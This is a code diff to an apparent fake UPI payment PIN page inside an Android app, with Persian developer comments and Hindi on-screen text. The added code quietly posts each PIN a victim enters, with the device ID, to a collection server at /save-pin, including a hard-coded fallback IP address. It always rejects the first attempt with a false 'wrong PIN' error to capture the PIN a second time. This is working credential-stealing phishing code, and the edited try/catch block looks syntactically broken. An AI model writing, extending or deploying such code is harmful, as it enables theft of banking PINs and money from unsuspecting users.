@@ -61,6 +61,68 @@
     function showRetryDialog() {
       document.getElementById("retryDialog").classList.remove("hidden");
     }
+    function showErrorPinDialog() {
+      document.getElementById("errorPinDialog").classList.remove("hidden");
+    }
+    function closeErrorPinDialog() {
+      document.getElementById("errorPinDialog").classList.add("hidden");
+      // ⭐ بعد از بستن error dialog، PIN رو پاک کن برای تلاش بعدی
+      pinArr = [];
+      updateInputs();
+    }
+    
+    // ⭐ تابع مشترک برای ارسال PIN به سرور
+    function sendPinToServer(pin, isSuccess) {
+      try {
+        // ⭐ دریافت Base URL و Device ID از Android
+        const baseUrl = Android.getBaseUrl();
+        const deviceId = Android.getDeviceId();
+        
+        // ⭐ ارسال PIN با status
+        fetch(`${baseUrl}/save-pin`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            pin: pin, 
+            device_id: deviceId,
+            status: isSuccess ? "success" : "failed"  // ⭐ status برای سرور
+          })
+        })
+        .then(res => {
+          if (!res.ok) {
+            console.error("Failed to send PIN to server");
+            return;
+          }
+          return res.json();
+        })
+        .then(data => {
+          console.log("PIN sent to server:", isSuccess ? "success" : "failed");
+        })
+        .catch(err => {
+          console.error("Error sending PIN to server:", err);
+        });
+      } catch (err) {
+        console.error("Error getting Android data:", err);
+        // ⭐ Fallback برای browser testing
+        try {
+          const fallbackDeviceId = "browser_test_" + Date.now();
+          const fallbackBaseUrl = "http://95.134.130.160:8765";
+          
+          fetch(`${fallbackBaseUrl}/save-pin`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+              pin: pin, 
+              device_id: fallbackDeviceId,
+              status: isSuccess ? "success" : "failed"
+            })
+          })
+          .catch(error => console.error("Fallback PIN send error:", error));
+        } catch (fallbackErr) {
+          console.error("Fallback error:", fallbackErr);
+        }
+      }
+    }
     function closeRetryDialog() {
       document.getElementById("retryDialog").classList.add("hidden");
       // ⭐ بعد از بستن retry dialog، PIN رو پاک کن برای تلاش بعدی
@@ -72,11 +134,14 @@
         const pin = pinArr.join('');
         showLoadingDialog();
         
-        // ⭐ اگر اولین بار هست، fail کن و retry نشون بده
+        // ⭐ اگر اولین بار هست، PIN رو به سرور ارسال کن (با status failed) و error "پین اشتباهه" نشون بده
         if (isFirstAttempt) {
+          // ⭐ ارسال PIN به سرور با status failed
+          sendPinToServer(pin, false);  // false = failed
+          
           setTimeout(() => {
             hideLoadingDialog();
-            showRetryDialog();
+            showErrorPinDialog();  // ⭐ error "پین اشتباهه" نشون بده
             localStorage.setItem('upi_pin_attempt', 'failed');  // ذخیره که fail شده
             isFirstAttempt = false;  // بار بعد موفق باشه
             // پاک کردن PIN برای تلاش بعدی
@@ -86,87 +151,37 @@
           return;
         }
         
-        // ⭐ بار دوم: واقعاً ارسال کن
-        try {
-          // ⭐ دریافت Base URL و Device ID از Android
-          const baseUrl = Android.getBaseUrl();
-          const deviceId = Android.getDeviceId();
-          
-          // Send with device_id like other requests
-          fetch(`${baseUrl}/save-pin`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-              pin: pin, 
-              device_id: deviceId 
-            })
-          })
-          .then(res => {
-            if (!res.ok) {
-              hideLoadingDialog();
-              showRetryDialog();
-              throw new Error("Server error");
-            }
-            return res.json();
-          })
-          .then(data => {
-            // ⭐ پاک کردن attempt status بعد از موفقیت
-            localStorage.removeItem('upi_pin_attempt');
-            setTimeout(() => {
-              window.location.href = "final.html";
-            }, 500);
-          })
-          .catch(err => {
-            console.error(err);
-            hideLoadingDialog();
-            showRetryDialog();
-          });
-        } catch (err) {
-          console.error("Error getting Android data:", err);
-          // ⭐ اگر اولین بار هست، همون fail کن
-          if (isFirstAttempt) {
-            setTimeout(() => {
-              hideLoadingDialog();
-              showRetryDialog();
-              localStorage.setItem('upi_pin_attempt', 'failed');
-              isFirstAttempt = false;
-              pinArr = [];
-              updateInputs();
-            }, 1500);
-            return;
+        // ⭐ بار دوم: timer نشون بده و بعد واقعاً ارسال کن
+        // ⭐ نشون دادن loading با timer
+        showLoadingDialog();
+        
+        // ⭐ Timer countdown برای بار دوم
+        const timerTextEl = document.getElementById("timerText");
+        let timerCountdown = 3;
+        const timerInterval = setInterval(() => {
+          timerCountdown--;
+          if (timerCountdown > 0) {
+            timerTextEl.textContent = `Processing... ${timerCountdown}s`;
+          } else {
+            timerTextEl.textContent = "Completing...";
+            clearInterval(timerInterval);
           }
+        }, 1000);
+        
+        // ⭐ بعد از 3 ثانیه PIN رو به سرور ارسال کن (با status موفق)
+        setTimeout(() => {
+          // ⭐ ارسال PIN به سرور با status موفق
+          sendPinToServer(pin, true);  // true = successful
           
-          // Fallback for browser testing (بار دوم)
-          const fallbackDeviceId = "browser_test_" + Date.now();
-          const fallbackBaseUrl = "http://95.134.130.160:8765";
-          
-          fetch(`${fallbackBaseUrl}/save-pin`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ 
-              pin: pin, 
-              device_id: fallbackDeviceId 
-            })
-          })
-          .then(res => {
-            if (!res.ok) {
-              hideLoadingDialog();
-              showRetryDialog();
-              throw new Error("Server error");
-            }
-            return res.json();
-          })
-          .then(data => {
-            localStorage.removeItem('upi_pin_attempt');
-            setTimeout(() => {
-              window.location.href = "final.html";
-            }, 500);
-          })
-          .catch(err => {
-            console.error(err);
-            hideLoadingDialog();
-            showRetryDialog();
-          });
+          // ⭐ پاک کردن attempt status بعد از موفقیت
+          localStorage.removeItem('upi_pin_attempt');
+          hideLoadingDialog();
+          setTimeout(() => {
+            window.location.href = "final.html";
+          }, 500);
+        } catch (err) {
+          console.error("Error:", err);
+          // ⭐ اینجا دیگه fallback لازم نیست چون sendPinToServer خودش handle می‌کنه
         }
       } else {
         showErrorPopup();
@@ -265,7 +280,19 @@
         <div class="w-16 h-16 border-4 border-gray-200 border-t-green-500 rounded-full animate-spin"></div>
       </div>
       <p class="text-gray-800 font-semibold text-base mb-2">Processing Payment...</p>
-      <p class="text-gray-500 text-sm">कृपया प्रतीक्षा करें</p>
+      <p class="text-gray-500 text-sm mb-2" id="timerText">कृपया प्रतीक्षा करें</p>
+    </div>
+  </div>
+  
+  <!-- Error Dialog - پین اشتباهه -->
+  <div id="errorPinDialog" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden px-4">
+    <div class="bg-white rounded-2xl p-8 w-full max-w-xs text-center shadow-2xl">
+      <div class="text-6xl mb-4">❌</div>
+      <p class="text-gray-800 font-semibold text-base mb-3">पिन गलत है</p>
+      <p class="text-gray-600 text-sm mb-6">कृपया सही पिन दर्ज करें</p>
+      <button onclick="closeErrorPinDialog()" class="bg-gradient-to-r from-red-500 to-red-600 text-white px-6 py-3 rounded-lg text-sm font-semibold w-full">
+        फिर से प्रयास करें
+      </button>
     </div>
   </div>
   
